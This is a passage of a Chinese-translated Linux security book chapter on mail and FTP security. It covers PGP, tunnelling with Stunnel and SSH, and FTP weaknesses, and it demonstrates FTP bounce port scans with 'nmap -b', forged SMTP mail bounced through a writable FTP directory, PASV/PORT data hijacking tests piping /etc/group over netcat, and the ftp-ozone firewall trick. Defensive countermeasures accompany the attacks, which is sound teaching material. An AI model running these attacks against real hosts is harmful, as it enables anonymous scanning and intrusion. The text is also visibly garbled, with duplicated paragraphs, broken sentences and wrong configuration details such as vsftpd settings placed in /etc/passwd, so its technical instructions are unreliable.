最广泛支持的加密是 PGP。对于我们的 PGP 软件，我们倾向于 `GnPG`，即 GNU Privacy Guard，可以在 `http://www.gnupg.org` 获取（以及那些烦人的密码学法）。许多在美国境外编写的邮件客户端（如 `Mutt`、`Pine` 和 `Elm`）支持 PGP。

如果你的邮件包含敏感数据，你不应该在不加密的情况下发送它。任何现代客户端都有可用的钩子——如果没有，按照定义它就不是现代的。最广泛支持的加密是 PGP。对于我们的 PGP 软件，我们倾向于 `GnPG`，即 GNU Privacy Guard，可以在 `http://www.gnupg.org` 获取（以及那些烦人的密码学法）。许多邮件客户端会嗅探你机器与目标之间的连接。连接，许多在美国境外编写的邮件客户端（如 `Mutt`、`Pine` 和 `Elm`）支持 PGP。由于邮件经常通过不同的中继路由（例如对于企业内部网），因此在每一步，黑客或仅仅是不道德的管理员都可以获取。理论上，任何中继你邮件的系统如果需要，都会保留一份，即使是存储原始未加密位数据的磁盘，如果强大的组织决定恢复即使被删除的数据，也应该显示出来。

某些 `SMTP` 服务器和客户端开始支持 `SMTP-AUTH`，这是 `SMTP` 的一个扩展，允许用户向服务器进行身份验证。这通常用于允许在通常会被拒绝的情况下进行中继，例如合法用户从家庭拨号账户连接到公司的邮件服务器。此用户名和密码通常与 Linux 账户相同，这可能会产生灾性的安全影响。

# 第 11 章：邮件与 FTP 安全

```
220 example.org SMTP Postfix
EHLO localhost
250-example.org
250-PIPELINING
250-SIZE 5000000
250-ETRN
250-STARTTLS
250 8BITIME
```

列表底部 `250-STARTTLS` 条目显示该服务器支持通道加密。

# 深度解析 Linux Linux：Linux 安全机密与解决方案

## 使用 Stunnel 对 IMAP 进行加密

假设你想使用 `Mutt` 连接到 `mailserver.example.com`。你编译了带有 SSL 支持的 `Mutt`，但你的 IMAP 服务器不支持它。在服务器上运行 `Stunnel` 以在 `imaps` 端口上监听连接，具体如下所示：

```
mailserver# /usr/bin/stunnel -D mail.debug -p /path/to/stunnel.pem \
-N simapd -d simap -1l /usr/sbin/imapd
```

将你的 `$MAIL` 环境变量指向邮件服务器：

```
client$ export MAIL='mailserver.example.com/ssl'
client$ mutt
```

当连接到达 `imaps` 端口时，`Stunnel` 会启动 `imapd` 服务器，就像通常情况下直接启动它那样。然而，`Stunnel` 将处理 SSL 连接的解密，而 `imapd` 无需感知加密层的任何信息。

> 注意：`Stunnel` 可以使用 TCP wrappers，请确保在 `/etc/hosts.allow` 中添加了相应的行，以允许你想要接受的连接。

## 使用 SSH 对 POP 进行加密

假设我们希望让 `Fetchmail` 通过 POP 提取我们的电子邮件。如果我们能够通过 SSH 登录服务器，那么就可以使用 SSH 转发功能通过加密通道为我们的 POP 连接建立隧道。在尝试运行 `fetchmail` 之前，只需运行以下命令：

```
client$ ssh -n -x -f mailserver.example.com -L8765:mailserver.example.com:110 \
  'sleep 60'
```

运行 `fetchmail` 时，指向本地机器 `8765` 端口的任何连接都将通过加密通道发送到邮件服务器上的 POP 端口。在命令行参数中包含 `--port 8765` 并将其指向 `localhost` 而不是 `mailserver.example.com`。

你可以通过在 `.fetchmailrc` 中包含以下行来进一步简化操作，这样你就不再需要手动执行 SSH 了：

```
poll localhost port 1234 with proto pop3:
preconnect "ssh -n -x -f mailserver.example.com \
-L 8765:mailserver.example.com:110 'sleep 60'"
```



> 注意：为了使此方法生效，你必须以某种方式启用对 `mailserver.example.com` 的免密登录，例如在两个主机之间启用 `hosts.equiv` 信任，或运行带有信任身份的 `ssh-agent`。然而，这些方法超出了本节的范围。

我们建议访问 `http://www.employees.org/~satch/ssh/faq/` 查看 SSH FAQ

# 第 11 章：邮件与 FTP 安全

## 安全密码认证

某些 POP 客户端开始支持 `APOP` 和 `KPOP` 认证。这些方法允许你在明文通道上对 POP 服务器进行身份验证，而不会让密码明文暴露。服务器将向 POP 客户端发出挑战，客户端将使用该挑战和密码生成响应并发送回服务器。由于密码从未通过网络传输，因此它是不会被嗅获的。

遗憾的是，并不是所有的邮件客户端或服务器都支持这些认证方法，因此你可能需要规定用户允许哪些软件——这通常并不受欢迎。另一个问题是，尽管密码受到了保护，但连接仍然是明文的，这意味着仍然容易受到嗅探和会话劫持的攻击。如果发送的邮件敏感，那么你应该使用上面列出的真正的加密方法之一。

# 文件传输协议 (FTP)

互联网最大的优势之一是共享任何类型的信息、程序和源代码。在万维网创建很久，人们就已经使用 `FTP`（文件传输协议）发送和接收数据。与 `FTP` 相关的早期 RFC 可以追溯到 1971 年，当时互联网仍然是 `ARPANET`。

在 `HTTP` 出现之前，`FTP` 是事实上的文件传输方法。现在它可能仅次于 `HTTP`，后者仍然是源代码分发的主要方法。遗憾的是，`FTP` 服务器的安全记录非常糟糕。最广泛使用的 `wu-ftpd` 在 1995 年到 2000 年之间出现过十个可能导致 root 权限被取的漏洞。`FTP` 协议本身被以各种巧妙的方式滥用。为了理解我们讨论的问题，我们必须首先提供 `FTP` 协议工作原理的概述。

# FTP 协议

大多数现代协议使用单一网络连接，所有数据通过该连接传输。例如，使用 `HTTP/1.1` 时，客户端在服务器的 80 端口打开连接并请求特定页面。服务器告诉客户端预期字节字节，当接收到后，客户端可以在同一通道上发出额外的请求。然而，`FTP` 协议使用两个独立的通道分别用于命令和数据流。

- **命令通道 (Command Channel)**：命令通道是连接你的 `FTP` 到 `FTP` 服务器 21 端口的网络套接字。像 `LIST` 和 `RETR` 等命令通过此通道发送，并且在整个 `FTP` 会话期间保持活跃。
- **数据通道 (Data Channel)**：每当客户端和服务器需要交换数据时，数据通道就会建立并断开。这包括带有 put 和 get 文件列表的数据传输。该连接由后续两个章节描述的 `PORT` 或 `PASV` 命令动态创建。

`FTP` 协议的双通道特性曾让许多防火墙管理员头疼不已。频繁的动态连接需要在应用代理逻辑中处理，例如使用 TIS 防火墙工具包中的 `ftp-gw`，或者在使用 `ipchains` 伪装时使用 `ip_masq_ftp`。

为了理解我们讨论的问题，我们必须首先提供 `FTP` 协议工作原理的概述。

# 示例会话

为了更好地看到后台发生了什么，使用 `-d` 模式查看客户端发送的内容：

```
ftp> ls
machine# ftp.example.org
220 ftp.example.org ready.
Name (localhost):user
331 required for user.
Password: ***
230 User logged in.
```

## 主动模式 FTP

第一种支持的数据传输模式称为主动模式。尽管较新的 Linux 发行版开始使用被动模式。让我们在详细模式下查看 `FTP` 会话：

```
ftp> ls
--> PORT 10,15,82,78,6,156
200 PORT command successful.
--> LIST
150 Opening ASCII mode connection for /bin.
total 100
drwx------ 2 ftpuser users 4096 Feb 28 2000 bin
-rw-r---- 1 ftpuser users 33392 Jan 25 15:14 mutt.tgz
-rw-r---- 1 ftpuser users 40184 Sep 17 01:01 stunnel-31.tgz
drwx------ 2 ftpuser users 4096 Sep 17 01:01 tmp
226 Transfer complete.
```

```
ftp> get mutt.tgz
--> PORT 10,15,82,78,16,29
200 PORT command successful.
--> RETR mutt.tgz
150 Opening BINARY mode data connection for mutt.tgz (33392 bytes).
226 Transfer complete.

33392 bytes received in 0.097 secs (3.4e+02 Kbytes/sec)
ftp>
```

当用户输入 `ls` 命令时，`FTP` 客户端绑定一个本地端口，服务器连接到该端口以发送请求的数据。它通过 `PORT` 命令告知服务器端口和 IP 地址，格式如下：

`PORT W, X, Y, Z, H, L`

`W, X, Y, Z` 是 IP 地址的四个字节（`10.15.82.78`）。`H` 和 `L` 是端口号的高低字节。因此，在示例中 `FTP` 客户端绑定端口 1692，即 `6 * 256 + 156`。随后客户端发送实际请求，在此例为 `LIST`。服务器随后从服务器端口 20（ftp-data 端口）连接到客户端的 1692 端口。如果连接成功建立，它将发送请求的数据并断开连接。

# Linux 攻击揭秘：Linux 安全秘密与解决方案

`PORT` 命令的使用也可以出现在文件检索中。客户端打开本地端口 4125 (`16 * 256 + 29`)，并请求检索名为 `RETR mutt.tgz` 的文件。

## 被动模式 FTP

在被动模式下，`FTP` 客户端请求服务器打开一个端口，以便连接并进行数据传输，如下所示：

```
ftp> ls
--> PASV
227 Entering Passive Mode (172,25,17,28,124,175)
--> LIST
150 Opening ASCII mode data connection for /bin/ls.
total 100
drw------ 2 ftpuser users 4096 Feb 28 2000 Mail
drwx------ 2 ftpuser users 4096 Feb 25 2000 bin
-rw------ 1 ftpuser users 33392 Jan 15 10:14 mutt.tgz
-rw------ 1 ftpuser users 40184 Sep 17 01:01 stunnel-3.11.tgz
drwx------ 2 ftpuser users 4096 Sep 17 01:01 tmp
226 Transfer complete.
ftp>
```

当 `FTP` 服务器接收到 `PASV` 命令时，它会绑定本地端口，在本例中为 31919。它在 `PASV` 结果代码中告诉 `FTP` 客户端它绑定到了哪个端口：

```
227 Entering Passive Mode (172,25,17,28,124,175)
```

这些数字的处理方式与 `PORT` 请求中完全相同，即 IP 地址和由逗号分隔的高/低位端口字节。当客户端发送 `LIST` 命令时，服务器会等待客户端机器的连接，并通过该套接字发送数据。

## 明文密码

| 流行度 | 8 |
| :--- | :--- |
| 简单性 | 8 |
| 影响 | 7 |
| 风险等级 | 8 |

`FTP` 协议最大的问题之一是用户名和密码是以明文在网络上传输的。如果攻击者能够访问客户端和服务器之间的任何线缆，他就可以嗅探这些信息。大多数情况下，`FTP` 用户是系统的有效用户

![](img/33829ffb1435b4baef56fcd2c28ec6cd_425_0.png)

## 第 11 章：邮件与 FTP 安全

（在系统上），因此攻击者可以获得该账户的 shell 访问权限，并从那里尝试获取 root 权限。

注意：匿名 `FTP` 虽然也容易受到这种攻击，但实际上并不会受到影响，因为提供的密码通常是电子邮件地址或垃圾字符串，没有任何可利用的价值。

## 明文密码防御措施

你可以使用一些技巧来加密 `FTP` 的命令通道（即发送密码的通道）。然而，无法保护瞬态数据通道。为了使此技巧生效，客户端和服务器必须使用主动模式（Active FTP），且 `FTP` 服务器必须允许向非命令通道源的机器执行 `PORT` 命令。

在这里我们展示了一个 `FTP` 用户向与实际 `FTP` 服务器位于同一网络上的机器建立 `SSH` 连接的示例。`Ssh` 程序将通过绑定到本地端口 (`221`) 来隧道命令通道，该端口会被转发到 `FTP` 服务器的 21 端口。



```
$ ftpclient ssh -L 2121:ftpserver.example.com:21 trusted_machine.example.com
```

```
# 然后，在另一个独立的 shell 中：
ftclient$ ftp localhost 2121
```

客户端认为它正在与 `localhost` 通信，但 `SSH` 会将这些包转发到实际的 `FTP` 端口。然而，客户端将使用其真实的 `IP` 地址发送 `PORT` 命令，服务器将直接与其联系，而不是通过 `SSH` 转发。我们建议你查阅 `http://www.employees.org/~satch/ssh/faq` `get SSH FAQ` 以获取更多示例。

提示：如果你拥有 `FTP` 服务器本身的登录权限，那么你应该直接使用 `scp` 或 `sftp`，而不是同时使用 `SSH` 转发。

另一种选择是使用一次性密码算法进行认证。这允许你以明文发送密码，但使其在后续连接中失效。获取密码的攻击者将无法使用它。你可以针对所有的 `Linux` 登录——假设你的 `Linux` 机器支持 `PAM`（大多数机器都支持），通过修改 `/etc/pam.d/ftp` 文件来使用你选择的一次性密码算法。关于一次性密码的更多信息，请参阅第 9 章。

警告：保护密码非常重要。然而，任何不包含加密的连接都会受到会话劫持或嗅探等其他网络攻击。只要可能，请避免使用盛行的明文协议。

# Linux 攻击揭秘：Linux 安全秘密与解决方案

## 信息性 FTP 横幅

| 流行度 | 6 |
| :--- | :--- |
| 简单性 | 10 |
| 影响 | 5 |
| 风险等级 | 7 |

`FTP` 服务器在连接后会立即向客户端输出横幅。服务器可能如下所示：

```
machine$ nc ftpserver.example.org 21
220.dmz.example.org FTP server (Version 2.0.0)
   Sat Feb 5 23:37 EST 2001 ready.
```

在这个示例中，`FTP` 服务器提供了若干信息：

**`FTP` 服务器版本**：运行 `Version.2.0`。知道服务器版本可以帮助攻击者使用正确的漏洞。

**当前时间**：虽然可能看起来无害，但对于基于时间的攻击（例如使用时间作为随机种子的系统），时间是有用的。

**主机名**：虽然我们从外部看到的是 `ftpserver.example.org`，但它认为自己的主机名是 `tux.example.org`。这告诉我们它是一个 `Linux` 机器（当然，`tux` 是吉祥物），并且位于 `DMZ`（隔离区）防火墙之后。剥夺攻击者的信息并不是我们安全的依靠。然而，不使用默认横幅并没有增加攻击者的难度。每个 `FTP` 守护进程都有更改默认横幅的方法。

### 更改 vsftpd 的 FTP 横幅

你可以通过 `/etc/passwd` 文件中的各种配置选项来控制 `vsftpd` 展示 `FTP` 横幅的方式：

| 选项 | 描述 |
| :--- | :--- |
| greeting full | 提供完整的欢迎信息，包括主机名和版本。 |
| greeting brief | 仅显示主机名。 |
| greeting terse | 输出 "FTP server ready"。 |
| greeting text message | 输出消息本身。 |
| banner /path/to/ | 显示指定内容。可能会破坏不支持多行响应的旧 `FTP` 客户端。 |
| hostname | 设置主机名。这既用于初始横幅，也用于客户端退出时的总结。 |

我们的首选方案是将 `hostname` 设置为 `ftp.example.com`，并使用 `greeting text`。这将产生以下输出：

```
machine192.168.1.1
Connected to 192.168.1.1
220 Unauthorized access prohibited. This connection has been logged.
Name (192.168.1.1):
331 Password required
Password: *****
230 User logged in.
```

> 警告：在 `/etc/inetd.conf` 中包含 `-a` 标志，确保你的 `FTP` 守护进程查询 `/etc/access` 文件。

### 更改 ProFTPD 的 FTP 横幅

`ProFTPD` 使用配置文件 `/etc/proftpd.conf`。将 `ServerName` 变量从默认的 "`ProFTPD Default Installation`" 修改为新值，例如：

`ServerName "Unauthorized use of this FTP server prohibited. Go away."`

`ProFTPD` 可以监听多个端口和 `IP` 地址以提供具有不同特征的服务器。额外服务器位于 `VirtualHost` 指令中，其定义方式与 `Apache` 配置文件 `httpd.conf` 类似。如果你的机器有多个站点，你可以为每个 `VirtualHost` 更改 `ServerName`，如下：

```
<VirtualHost ftp.example.com>
  ServerName "This exhibit is closed. Please use the nearest exit."
  Port 2121
...
</VirtualHost>
```

```
<VirtualHost ftp2.example.com>
ServerName "Anonymous server. Unauthorized users will be banned."
...
```

## 通过第三方 FTP 服务器进行端口扫描

`FTP` 客户端发送的 `PORT` 命令告诉 `FTP` 服务器应该连接哪个 `IP` 和端口进行数据传输。通常情况下，这将是 客户端机器的 `IP` 地址及其绑定的端口。然而，`FTP` 规范本身并不要求请求的 `IP` 必须是客户端机器。

攻击者可以利用此通过无关的第三方 `FTP` 服务器进行端口扫描。这通常被称为 `FTP` 跳（bounce），因为攻击者的扫描是通过 `FTP` 服务器跳转的。攻击者可能出于两个主要原因使用这种扫描：

提供匿名性

端口扫描的源是攻击者的真实机器。如果目标机器具有扫描检测功能，它会正确指示是 `FTP` 服务器，要求目标机器管理员与 `FTP` 服务器管理员协调以确定扫描的真实来源。等这样做完成后，扫描早已完成，攻击者已经利用了所获得的任何信息。

绕过 `IP` 封锁

如果目标通过添加内核 `ACL` 或空路由自动封锁主机，那么攻击者在拒绝访问之前无法对主机进行完整扫描。然而，通过 `FTP` 服务器转发扫描，被封锁的是 `FTP` 服务器。攻击者可以使用一个 `FTP` 服务器扫描目标部分端口，然后在主机被封锁后，找到另一个 `FTP` 服务器用于剩余端口。当扫描完成，攻击者可以仅针对运行的服务运行漏洞，这不会触发扫描防御。

## Nmap FTP 跳扫描

| 流行度 | 6 |
| :--- | :--- |
| 简单性 | 7 |
| 影响 | 5 |
| 风险等级 | 6 |

`Nmap` 在第 3 章中进行了详细介绍，它是目前最好的端口扫描工具。惊讶的是，它支持滥用 `FTP` 的 `PORT` 命令通过第三方 `FTP` 服务器进行端口扫描。`PORT` 命令本身不足以欺骗 `FTP` 服务器建立连接；你必须有一些数据要传输。因此 `Nmap` 简单地使用了 `LIST` 命令。以这种方式使用 `Nmap` 进行端口扫描，是对 `nmap` 使用 `-b`（bounce）选项，其格式如下：

```
machine$ nmap -b username:password@ftpserver:port
```

# 第 11 章：邮件与 FTP 安全

如果未指定，用户名和密码默认为匿名（`anonymous`），端口默认为 `21`。因此，在匿名 `FTP` 服务器的极端情况下，你可以使用 `nmap -b ftpserver`。

提示 (`TIP`)

你可能希望让 `Nmap` 跳过对主机的 `ping` 测试；否则，如果实际目标无法从扫描机器访问，它将中止扫描。

注意 (`CAUTION`) 某些防火墙仅在受保护机器的 `IP` 地址发生变化时才会重写 `PORT` 和 `PASV` 命令；这种方法可以用于扫描防火墙后的机器。

```
hackerbox# nmap -P0 -b username:password@ftpserver:21 \
-p 5400,5500,5800,5900,6000 target.example.com
```

由 `fyodor@insecure.org` 启动的 `Nmap V. 2.3BETA14` ( << `www.insecure.org/nmap/` ) `target.example.com` 上的有趣端口 (`172.16.217.202`):

| 端口 | 状态 | 协议 | 服务 |
| :--- | :--- | :--- | :--- |
| 5400 | open | tcp | unknown |
| 5800 | open | tcp | vnc |
| 5900 | open | tcp | vnc |



Nmap 端口扫描完成 -- 在 12 秒内扫描了 1 个 IP 地址 (1 个主机)

通过 FTP 服务器进行 Nmap 端口扫描比普通端口扫描慢，因为 Nmap 完全没有控制包范围的能力，而是必须依赖 FTP 服务器的完整 TCP 三次握手。这意味着 Nmap 无法并行扫描端口，除非你编写脚本让 Nmap 为不同的端口范围向 FTP 服务器建立多个连接。

# FTP 弹跳扫描攻击 (FTP Bounce Scan) 应对措施

许多 FTP 服务器的出站连接源端口为 20，即 `ftp-data` 端口。如果你阻止从源端口 20 到你服务器的连接，那么就可以防止你的机器被 FTP 弹跳扫描。当然，你也可能阻止合法的 FTP 流量。

```
# 针对 2.2 内核：
ipchains -A input -i eth0 -p tcp -d $ME -s 0/0 20 www -j DENY

# 针对 2.4 内核：
iptables -A INPUT -i eth0 -p tcp -d $ME -s 0/0 --dport 20 -j DENY
```

注意 (`CAUTION`) 然而，实际上并不是所有的 FTP 服务器都使用端口 20 作为源端口，因此这不是万无一击的解决方案。

# 暴露的 Linux：Linux 安全与解决方案

以下是 FTP 服务器在 Nmap 扫描期间记录的条目：

```
command: USER username
<--- 331 username 需要密码
command: PASS password
<--- 230 用户 username 已登录。
FTP LOGIN FROM hacker_box.com [192.168.2.2], username
command: PORT 172,16,217,202,23,112 #端口 6000
<--- 200 PORT 命令成功。
command: LIST
<--- 425 无法建立数据连接：连接被拒绝。
command: PORT 172,16,217,202,21,124 #端口 5500
<--- 200 PORT 命令成功。
command: LIST
<--- 425 无法建立数据连接：无法分配请求地址。
command: PORT 172,16,217,202,23,12 #端口 5900
<--- 200 PORT 命令成功。
command: LIST
<--- 150 正在为 /bin/ls 开启 ASCII 模式数据连接。
<--- 226 传输完成。
command: PORT 172,16,217,202,22,168 #端口 5400
<--- 200 PORT 命令成功。
command: LIST
<--- 150 正在为 /bin/ls 开启 ASCII 模式数据连接。
<--- 226 传输完成。
<--- 200 PORT 命令成功。
command: LIST
<--- 150 正在为 /bin/ls 开启 ASCII 模式数据连接。
<--- 226 传输完成。
<--- 221 你至少可以说再见。
FTP 会话关闭
```

我们在 PORT 行的末尾添加了端口号以便阅读。使用 `ftpd -1lvLaio` 中的参数为 FTP 服务器 (`wu-ftpd`) 开启了完整调试。

客户端的 IP 地址为 `192.168.2.2`。然而，PORT 命令将 FTP 服务器指向了 `172.16.217.202`，即实际扫描目标。大量的 `425` 错误信息（连接失败）表明某些异常。请使用你的日志分析工具关注这些错误。

大多数 FTP 服务器现在已配置为拒绝除 FTP 客户端机器以外的 IP 地址的 PORT 命令，尽管它们实现这个简单的更改花费了一段时间。例如，“Hobit”在 1995 年 7 月在 Bugtraq 的一个帖子中写过这个问题，但 `wu-ftpd` 直到 1999 年 10 月才实现解决方案。

因此，你应该手动检查以确保你的 FTP 服务器已配置为拒绝不当的 PORT 选择。这里有一种检查你系统的快速方法：

```
machine$ cat ftp.bounce.detect
USER username
PASS password
PORT 127,0,0,1,10,10
LIST
QUIT
```

```
machine$ nc ftpserver 21 < ftp.bounce.detect
220 欢迎来到我们的 FTP 服务器。祝你有愉快的一天！
331 username 需要密码。
230 用户 username 已登录。
200 PORT 命令成功。
425 无法建立数据连接：连接被拒绝。
221 你在 0 个文件中传输了 0 字节。
221 此会话的流量流量为 92 字节。
221 再见。
```

在示例中，服务器容易受到弹跳攻击，正如“425 无法建立数据连接：连接被拒绝”行所示。这表明机器实际上尝试联系 PORT 命令中列出的主机/端口。大多数配置适当的 FTP 服务器将给你一个不同的错误信息，或者更有可能立即断开连接，如下所示：

```
machine$ nc anotherftpserver 21 < ftp.bounce.detect
220 欢迎来到我们的 FTP 服务器。祝你有愉快的一天！
331 username 需要密码。
230 用户 username 已登录。
```

# 攻破解 Linux 解析：安全秘密与解决方案

```perl
open NC, "nc Hostname 21" or die "Can't fork netcat";
NC->autoflush(1);

print NC "USER $username\nPASS $password\n";
for ( 1..10 ) { sleep 1; print NC "PASV\n"; }
print NC "QUIT\n";
```

只需运行该程序并检查输出：

```
machine$ pasv_ports.pl anonftpserver
已打开被动端口：
8273 8274 8276 8277 8279 8280 8281 8282 8283 8285
```

```
machine$ pasv_ports.my ftpserver username password
已打开被动端口：
41715 5982 35909 51887 42917 1541 24804 47636 6144 29254
```

第一台服务器使用顺序端口号。序列中偶尔出现的断开是因为其他用户建立了 PASV FTP 连接。然而，第二台机器显然是以随机方式生成端口的。如果你的服务器使用顺序端口，请更新到最新版本，或者如果你计划支持 PASV FTP，请切换到不同的 FTP 服务器。

为了能够通过防火墙或路由器的访问控制列表（ACL）支持 FTP，FTP 服务器通常被配置为仅对 PASV FTP 使用一小范围的端口。这缩小了黑客需要尝试的端口范围。讽刺的是，为了防火墙安全限制 PASV 端口反而让数据劫持变得更容易，因为黑客需要连接的端口更少了。

避免 PASV 数据劫持的一种方法显然是不使用被动 FTP。然而，FTP 客户端默认使用主动 FTP，但你可以通过运行 `ftp -p hostname` 或 `pftp hostname` 客户端来强制进入被动模式。

# PORT FTP 数据劫持

| 流行度 | 3 |

| :--- | :--- |

| 简单性 | 3 |

| 影响 | 5 |

| 风险等级 | 4 |

# 第 11 章：邮件与 FTP 安全

主动 FTP 的劫持方式与被动 FTP 非常相似。数据端口不是在 FTP 服务器上打开，而是在 FTP 客户端上，正如 FTP 命令中指定的那样。然而，这种攻击对黑客的吸引力较小。他们很容易选择一个 FTP 服务器，并认定其中有你想访问的数据，然后尝试获取 PASV 端口以期获得某些东西。但是，尝试通过攻击 FTP 客户端来获取那些数据并不简单。

首先，攻击者必须知道哪些 FTP 客户端正在访问该 FTP 服务器。这些信息显然在 FTP 服务器本身上可用，但如果攻击者能够直接访问 FTP 服务器，他已经获得了访问 FTP 数据的权限。因此，这需要大量的猜测。

> 黑客可能能够获取到哪台机器正在访问 FTP 服务器，这并不遥不可及。例如，某位员工想要访问其他部门访问的内部 FTP 服务器上的机密人力资源（HR）或薪资账单文件。

# PORT FTP 劫持防御措施

你可以通过运行以下命令模拟攻击，以测试 FTP 客户端是否存在漏洞。由于尝试在 PORT 和 LIST 命令之间插入我们的数据的暴力破解失败，并不能断判定客户端是安全的，我们将手动伪造一个 FTP 连接，并控制 PORT 和数据传输命令的时机。我们求助于朋友 Netcat：



```bash
# 在机器上启动一个伪造 FTP 服务器
ftpserver$ cat fake.ftp.server
220 Welcome.
331 Password required
230 User logged in
215 Unix Type: L8
200 PORT command successful.
150 Opening data connection for LIST
```

```bash
ftpserver$ nc -p 2121 -l < fake.ftp.server
```

```bash
# 启动我们的 FTP 客户端
client_machine$ ftp ftserver
```

# 攻破解 Linux 解析：Linux 安全秘密与解决方案

220 Welcome.

Name (localhost:username): irrelevant

331 Password required

Password: ********

230 User logged in

Remote system type is Unix.

ftp> ls

200 PORT command successful.

150 Opening data connection for LIST

此时，客户端正在等待“服务器”连接到我们本地绑定的端口。我们在伪造的 FTP 服务器（Netcat）窗口中看到来自 FTP 客户端的以下输出：

`USER irrelevant`
`PASS password`
`SYST`
`PORT 10,10,10,10,5,210`
`LIST`

为了测试该漏洞，我们需要从 FTP 服务器之外的其他机器连接到 FTP 客户端的 1490 端口（5 * 256 + 210）并发送数据。
```bash
third-machine$ cat /etc/group | nc 10.10.10.10 1490
```

如果你在 FTP 客户端窗口看到了来自第三方机器的 `/etc/group` 文件的前十行，那么你的 FTP 客户端容易受到 PORT FTP 劫持。事实上，我们尝试的一些客户端确实如此。

如果你的 FTP 客户端存在漏洞该怎么办？尝试使用新的客户端，或者仅使用被动模式 FTP。

## 启用第三方 FTP

现在我们已经讨论了允许任意 `PORT` 命令的一些问题，但我们承认，在正确配置的情况下，它们具有某些用途。通过巧妙使用 `PORT` 和 `PASV`，我们可以让 FTP 客户端直接从一台 FTP 服务器发送数据到第二台服务器。在弹回攻击流行之前，我们广泛地使用此功能来管理互联网上远程系统之间的文件，因为数据本身从不经过控制机器。某些图形化客户端支持此功能。最早的工具之一是 `Xftp`，可以在 `http://www.xftp.org/` 获取（见图 11-1）。

以从第三方机器从 `ftpserver` 向 `ftps2` 发送文件尾部文件为例。为了演示这一操作过程，我们将使用 Netcat 手动执行 FTP 会话：

```bash
ftpclient$ nc ftpserver 21

USER username

331 Password required

PASS password

230 User logged in.

TYPE I

200 Type set to I.

CWD /archive/movies

250 CWD command successful.

PASV

227 Entering Passive Mode (10,10,10,10,6,4)

RETR trailer.mpg

150 Opening data connection for trailer.mpg

226 Transfer complete.
```

```bash
ftpclient$ nc ftps2 21

USER username

331 Password required

PASS password

230 User logged in.

TYPE I

200 Type set to I.

CWD /www.example.com/movies

250 CWD command successful.

PORT 10,10,10,10,6,4

200 PORT command successful.

STOR trailer.mpg

150 Opening data connection for trailer.mpg

226 Transfer complete.
```

`PASV` 命令导致 `ftpserver1` 绑定了一个本地端口，而发出的 `PORT` 命令指向 `ftps2`。如果你需要以这种方式允许第三方 FTP，请在 `ftpaccess` 文件中添加以下行，以增强安全性：

```
# 允许 ftps1 作为 PORT 命令的目标
# (FTP_SERVER_IP)
port-allow ftps1.example.com
```

```
# 允许 ftps1 接受 PASV 请求
pasv-allow ftps1.example.com
```

`PASV` 命令导致 `ftpserver1` 绑定了一个本地端口，向 `ftps2` 发出了 `PORT` 命令。当 `RETR` 和 `STOR` 命令发送时，`ftps2` 连接到了 `ftps1`。

## FTP 弹回攻击

| 流行度 | 6 |
| :--- | :--- |
| 简单性 | 6 |
| 影响 | 6 |
| 风险等级 | 6 |

我们已经展示了如何使用 FTP `PORT` 命令匿名扫描第三方主机。为了确定端口是否开放，它运行了 `PORT` 命令后运行 `LIST` 命令以建立数据通道。选择 `LIST` 是因为它几乎可以被支持，并且不依赖机器上的任何文件来建立连接。

## 第 11 章：邮件与 FTP 安全

如果黑客能够向服务器上传文件，他就可以利用 `PORT` 和 `RETR` 命令发送任意数据。假设黑客发现了一个具有全局可写输入目录的 FTP 服务器，并运行了以下命令：

```bash
hackerbox$ cat anonymous_mail.smtp

HELO ftperver.example.com

mail from: user@some_host.com

rcpt to: mailbomb_recipient@other_host.com

data

...
```

```bash
hackerbox$ nc ftpserver incoming anonymous_mail.smtp
hackerbox$ nc ftpserver 21

USER anonymous

PASS ftp@example.com

PORT 10,10,10,10,25

RETR anonymous_mail.smtp

QUIT
```

FTP 服务器将文件 `anonymous_mail.smtp` 发送到邮件服务器 `10.10.10.10` 的 SMTP 端口（25）。文件本身被构造为创建 SMTP 命令，邮件服务器会认为 FTP 服务器是连接的源，从而有效地屏蔽了确定邮件原始源的能力。

使用这种方法发布无法追溯的邮件或新闻并不特别有趣，因为有其他同样有效的方法。然而，它可以用于任何数据连接，可以对外攻击任何网络服务（如 IMAP、POP 或 lpd）。攻击的源似乎是 FTP 服务器。

## FTP 回弹攻击防御措施

这种攻击要求你的 FTP 服务器托管任意的 `PORT` 命令，并且攻击者拥有一个可写的目录或文件，他可以在其中放置他想要查看的数据。请参考本章节前面的“FTP 回弹扫描防御措施”部分，了解如何保护你的机器免受此类攻击对 `PORT` 命令的要求。

如果攻击者拥有该机器的实际 FTP 登录权限，那么他可能拥有服务器的一个可写区域。然而，如果这是一个匿名 FTP 服务器，你应该确保受限制的 FTP 监狱中没有对 world可写的目录或文件。假设 FTP 用户的 uid 为 100，用户组为 200，可以通过以下命令轻松实现：

```
ftpserver cd /path/to/ftp/jail
ftpserver find \ -user 100 -o -group 200 -o -perm -002 \ -a -ls
```



这个命令实际上比所需的还要“偏执”。如果由于某种原因，你有一些由匿名 FTP 用户拥有但没有写权限的文件，并且你禁用了 `SITE CHMOD` 命令，那么用户就无法将文件设为可写，理论上讲你是安全的。

> 注意：你目前可能锁定了所有设置，但下次 `ftppd` 升级时，你所做的限制可能会被覆盖，或者配置语法发生变化，你可能会发现自己再次暴露。最好的办法是让 FTP 区域没有任何匿名 FTP 用户拥有的文件，从而彻底解决问题。

# 不安全的状态检测防火墙规则

由于 FTP 是一种双通道协议，任何想要支持它的防火墙都必须配置为处理动态创建的数据。相比之下，HTTP 连接是单连接，所有数据都通过它流动，不需要创建和销毁次级通道。

许多常见的免费和商业防火墙被发现了两个问题，可能会影响你的 Linux 安全。

# 防火墙后 FTP 服务器的未经授权端口访问

| | |
|---|---|
| 流行度: | 4 |
| 简单性: | 6 |
| 影响: | 6 |
| 风险等级: | 5 |

FTP 服务器通常被放在 DMZ 的防火墙后面，除了 FTP 流量外，所有访问都被拦截。当 FTP 服务器发送 `PASV` 命令时，防火墙必须为数据连接打开指定的端口，并在完成后将其关闭。遗憾的是，大多数防火墙并没有维护真正的 FTP 会话状态（为了速度而非详尽性），并且可能被骗打开这些端口，方法要么让 FTP 服务器发送包含包含看似 `PASV` 命令的错误消息，要么直接从客户端本身在命令通道上发送 `PASV` 命令。

`Dug Song` 为这种安全漏洞编写了一个利用程序，可用地址为：http://www.mon-key.org/~dugsong/ftp-ozone.c。我们将使用它来连接到位于防火墙后的 FTP 服务器的 79 端口（finger）：

### 证明你无法访问 79 端口

```
hackerbox# nc -v -v secure-ftp.example.com 79

secure-ftp.example.com 79 (finger) : Connection refused

set 0, rcvd 0
```

### 让 ftp-ozone 欺骗防火墙

```
hackerbox# ftp-ozone secure-ftp.example.com 79 &

[ now trying to connect to secure-ftp.example.com 79 ]
```

```
